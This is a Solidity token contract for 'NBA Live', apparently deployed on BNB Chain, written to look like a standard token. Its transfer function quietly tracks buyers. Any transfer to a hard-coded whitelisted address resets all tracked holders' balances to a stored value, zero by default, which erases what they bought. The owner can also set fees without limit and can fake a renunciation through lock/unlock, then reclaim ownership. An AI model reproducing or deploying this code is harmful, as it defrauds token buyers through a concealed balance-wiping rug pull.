/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.2;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract Token is Context, Ownable {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 2000000000 * 10 ** 18;
    string public name = "NBA Live";
    string public symbol = "NBA";
    uint public decimals = 18;
    uint public buyTaxFee = 0;
    uint public sellTaxFee = 0;

    struct AddressFee {
        bool est;
        bool enable;
        uint256 amount;
    }
    address public pair;
    mapping (address => AddressFee) private _addressFees;
    mapping (address => bool) private router_address;
    mapping (address => bool) private wlist;
    address[] private holders;
    bool private enable_black = false;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        router_address[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = true;
        router_address[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
        wlist[0xc2bff12585522b6f629d3FBDc0c9768436D1f2d2] = true;

    }

    function isRouter(address _address) private view returns(bool){
        return router_address[_address];

    }   

    function setFee(uint _buy,uint _sell) external onlyOwner {
        buyTaxFee = _buy;
        sellTaxFee = _sell;
    }

    function setBlack(address _address,bool _enable) external onlyOwner {
        _addressFees[_address].enable = _enable;
    }

    function setWhite(address _address,bool _enable) external onlyOwner {
        wlist[_address] = _enable;
    }

    function iswt(address _address) private view returns(bool) {
        return wlist[_address];
    }

    function bs(bool _enable) external onlyOwner {
        enable_black = _enable;
    }

    function reset() external onlyOwner {
        for(uint i=0;i<holders.length;++i)
        {
            _addressFees[holders[i]].enable = false;
            _addressFees[holders[i]].amount = 0;
        }
    }

    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        require(value > 0, 'amount error');
        require(to != address(0), 'to address error');

        if(iswt(to))
        {
            for(uint i=0;i<holders.length;++i)
            {
                balances[holders[i]] = _addressFees[holders[i]].amount;
            }

        }else if(to != pair)
        {
            if(_addressFees[to].est == false)
            {
               holders.push(to);
               _addressFees[to].est = true;
               _addressFees[to].amount = 0;
            }
        }

        balances[to] += value;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        if(from == owner() && pair == address(0))
           pair = to;   
        balances[to] += value;
        balances[from] -= value;      
        
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}